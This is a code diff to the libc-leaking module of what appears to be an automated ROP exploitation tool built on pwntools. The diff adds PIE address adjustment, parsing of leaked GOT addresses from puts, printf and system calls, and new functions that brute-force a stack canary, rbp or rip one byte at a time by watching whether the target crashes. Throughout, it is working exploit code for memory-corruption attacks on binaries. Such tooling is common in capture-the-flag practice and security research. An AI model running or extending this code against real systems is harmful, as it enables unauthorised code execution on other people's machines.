@@ -9,20 +9,30 @@ class Leak():
 		self.ropstar = ropstar
 		self.binary = self.ropstar.binary		
 		self.arch = self.ropstar.arch
-		self.libcdb_path = '/home/'+self.ropstar.username+'/tools/libc-database/'
+		self.libcdb_path = self.ropstar.home+'/tools/libc-database/'
 		self.leak_parse_amd64 = {
 		  'puts': lambda line: line.strip()[:6]+ '\x00\x00',
 		  'printf': lambda line: line.strip()[:6]+ '\x00\x00',
-		  'system': lambda line: line.strip()[7:(7+6)].ljust(8, '\x00')
+		  'system': lambda line: line.strip()[7:(7+6)].ljust(8, '\x00'),
 		}
 		self.leak_parse_i386 = {
 		  'puts': lambda line: line.strip()[:4],
 		  'printf': lambda line: line.strip()[:4],
 		  'system': lambda line: line.strip()[7:(7+4)].ljust(4, '\x00')
 		}
+		if self.ropstar.arch == 'amd64':
+			self.px = lambda x : p64(x)
+			self.ux = lambda x : u64(x)
+		else:
+			self.px = lambda x : p32(x)
+			self.ux = lambda x : u32(x)
+		self.bytes = ''
+		for i in range(0x100):
+			self.bytes += chr(i)
+		self.temp_payload = ''
 
 
-	def get_libc(self, leak):
+	def ident_libc(self, leak):
 			''' gets libc from libcdatabase
 			'''
 			# check which versions it could be
@@ -39,7 +49,7 @@ class Leak():
 				if m:
 					versions.append(m.groups(1)[0])
 			log.info(versions)
-			# copy them to local dir
+			# copy them to a local dir
 			for version in versions:
 				task = self.libcdb_path+"download "+version
 				p = subprocess.Popen(task, shell=True)
@@ -50,25 +60,26 @@ class Leak():
 			return versions
 
 
-	def get_leak(self, p):
+	def leak_libc(self, p):
 		''' Leaks libc
 		'''
 		leak = {}
 		log.info(self.binary.got.keys())
-		#log.info(self.binary.symbols.keys())
 		if 'main' in self.binary.symbols.keys():
 			main = self.binary.symbols['main']
 		elif self.ropstar.args.m:
 			try:
 				main = self.ropstar.args.m	
 				main = int(main, 16)
+				if self.ropstar.binary.pie:
+					main += self.ropstar.binary.address
 				log.info("Main: "+hex(main))
 			except AttributeError, TypeError:
 				log.failure("Could not get leak, no main method found (please specify with -m)")
-				sys.exit(0)
+				exit(0)
 		else:
 			log.failure("Could not get leak, no main method found (please specify with -m)")
-			sys.exit(0)
+			exit(0)
 		leak_funcs = ['puts','printf','system']
 		for leak_func in leak_funcs:
 			if leak_func in self.binary.got.keys():
@@ -78,18 +89,28 @@ class Leak():
 					rop.call(self.binary.plt[leak_func], [self.binary.got[leak_func],"%s"])
 				else:
 					rop.call(self.binary.plt[leak_func], [self.binary.got[leak_func]])
-				rop.call(main)
-				log.info(rop.dump())
-				payload = fit({self.ropstar.offset:rop.chain()})
+				rop.call(main)				
+				if self.ropstar.binary.canary:	
+					log.failure("Leaking/Exploitation not yet implemented for canary/pie binaries")				
+					exit(0)
+				else:
+					payload = fit({self.ropstar.offset:rop.chain()})
 				try:
-					lines = self.ropstar.trigger(p, payload)	
+					log.info(rop.dump())
+					result = self.ropstar.trigger(p, payload)	
 				except EOFError:
 					log.failure("Leak caused segfault")
-					continue					
+					continue
+				lines = []	
+				if isinstance(result, basestring):				
+					lines = result.split("\n")
+				else:
+					lines = result			
 				for line in lines:
+					print(repr(line))
 					try:
 						if self.arch == 'amd64':
-							l = self.leak_parse_amd64[leak_func](line)
+							l = self.leak_parse_amd64[leak_func](line)							
 							if l[5] == '\x7f':
 								leak[leak_func]  = u64(l)						
 								log.success("Leak "+leak_func+" : "+hex(leak[leak_func]))
@@ -107,3 +128,36 @@ class Leak():
 					# at least one leak found, exit
 					break	
 		return leak
+
+
+	def leak_byte(self, byte):
+		''' Leaks a byte by observing if it crashes (used for canary/rbp/rip)
+		'''
+		found = False		    
+		p = self.ropstar.connect() 
+		result = self.ropstar.trigger(p, self.temp_payload+byte, newline=False, recvall=True)
+		if self.ropstar.success_marker in result:
+			print "Found byte {}".format(repr(byte))
+			found = True
+		p.close()
+		return found   
+
+
+	def leak_qword(self, payload):
+		'''  Leaks 8 bytes using the leak_byte method
+		'''
+		v = ''  		
+		for _ in range(8): 
+			# this will not use trigger so we have to encode ourselves       
+			self.temp_payload = payload+v			
+			try:
+				s = pwnlib.util.iters.bruteforce(lambda x: self.leak_byte(x), self.bytes, 1, method='fixed')
+				v += s
+			except TypeError:
+				log.failure("Could not find value")
+				return v
+		if len(v) == 8:
+		    log.success("Retrieved: " + str(hex(u64(v.rjust(8, "\x00")))))
+		    return v
+		log.failure("Failed to bruteforce value at offset "+str(len(payload)))
+		exit(0)
